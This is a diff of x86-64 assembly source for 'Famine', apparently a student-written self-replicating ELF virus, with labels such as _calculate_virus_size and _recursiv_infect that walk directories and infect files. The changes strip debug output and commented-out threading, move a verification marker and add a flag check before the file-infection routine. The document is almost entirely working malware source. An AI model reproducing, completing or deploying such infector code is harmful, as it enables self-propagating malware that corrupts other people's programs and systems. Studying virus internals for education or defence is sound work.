@@ -25,10 +25,6 @@ _o_entry:
 _string:
 	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
 
-_verif:
-	dq 0x1122334455667788
-	db 0
-
 _start:
 ;	enter 16, 0
 	push rbp
@@ -90,7 +86,7 @@ _continue_normaly:
 	jne _jmp_to_o_entry
 _force_exit:
 	mov rdi, 0
-	mov rax, 60 ; exit syscall number, will not be in final code
+	mov rax, 60 ; exit syscall number
 	syscall
 
 _alternative_start:
@@ -110,8 +106,7 @@ _alternative_start:
 	pop rdi
 	pop rdi
 	pop rdi
-	mov rdi, 0
-	lea rax, [rel _force_exit]
+	jmp _force_exit
 
 ;_munmap_thread:
 ;	mov rax, 11
@@ -270,23 +265,6 @@ _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
 	add rdi, QWORD [rsp + 320]
 	mov BYTE [rdi], 0
 
-_print:
-	mov rax, 1
-	mov rdi, 1
-	mov rsi, rsp
-	sub rsi, QWORD [rsp + 336]
-	mov rdx, QWORD [rsp + 336]
-	syscall
-	mov rax, 1
-	mov rdi, 1
-	lea rsi, [rel _lol]
-	mov rdx, 1
-	syscall
-	jmp _calculate_virus_size
-
-_lol:
-	db 10
-
 _calculate_virus_size:
 ; virus_size = (&_final_end + 2) - &_string
 	xor r10, r10 ; r10 = 0
@@ -372,6 +350,13 @@ _treat_normally:
 	sub rsp, 8
 	mov QWORD [rsp], r10
 	add QWORD [rsp], 8
+	mov r11, rsp
+	add r11, QWORD [r11]
+	mov r10, 0
+	cmp QWORD [r11 + 368], 1
+	jne _call_treat_file
+	mov r10, 1
+_call_treat_file:
 	call _treat_file
 	add rsp, QWORD [rsp]
 	cmp rax, 0
@@ -391,39 +376,6 @@ _recursiv_infect:
 	je _continue
 	cmp WORD [rsi], 0x002e2e
 	je _continue
-;	mov rdi, rsi
-;	mov rsi, rsp
-
-;_check_for_max_fork:
-;	cmp QWORD [rsp + 352], 4
-;	jl _max_thread_per_process
-;_lab_lol:
-;;	call _read_dir
-;	mov rax, 61
-;	mov rdi, -1
-;	mov rsi, 0
-;	mov rdx, 0
-;	mov r10, 0
-;	mov r8, 0
-;	syscall
-;	dec QWORD [rsp + 352]
-;	jmp _max_thread_per_process
-
-;_max_thread_per_process:
-;	lea rdi, [rel _read_dir]
-;	mov rdx, rsp
-;	mov r10, QWORD [rsp + 336]
-;	mov rsi, QWORD [rsp + 296]
-;	add rsi, 19
-;	sub rdx, r10
-;	sub rsp, r10
-;	sub rsp, 8
-;	mov QWORD [rsp], r10
-;	add QWORD [rsp], 8
-;	call _thread_create
-;	add rsp, QWORD [rsp]
-;	cmp rax, -1
-;	jg _update_rsp
 
 	mov rdi, QWORD [rsp + 296]
 	add rdi, 19
@@ -461,32 +413,11 @@ _close_dir:
 	mov rax, 3
 	mov rdi, QWORD [rsp + 288]
 	syscall
-	jmp _end_ret
-
-_loop_wait_for_all_thread_to_exit:
-	cmp QWORD [rsp + 352], 0
-	jle _end_ret
-	mov rax, 61
-;	mov r10, rsp
-;	mov rsp, QWORD [r10 + 360]
-;	pop rdi
-;	mov QWORD [r10 + 360], rsp
-;	mov rsp, r10
-	mov rdi, -1
-;	mov rdi, 0
-	mov rsi, 0
-	mov rdx, 0
-	mov r10, 0
-;	mov rdx, 0
-	mov r8, 0
-	syscall
-	dec QWORD [rsp + 352]
-	jmp _loop_wait_for_all_thread_to_exit
 
 _end_ret:
-;	mov rax, 11
-;	mov rdi, QWORD [rsp + 360]
-;	mov rsi, 4096
-;	syscall
 	leave
 	ret
+
+_verif:
+	dq 0x1122334455667788
+	db 0
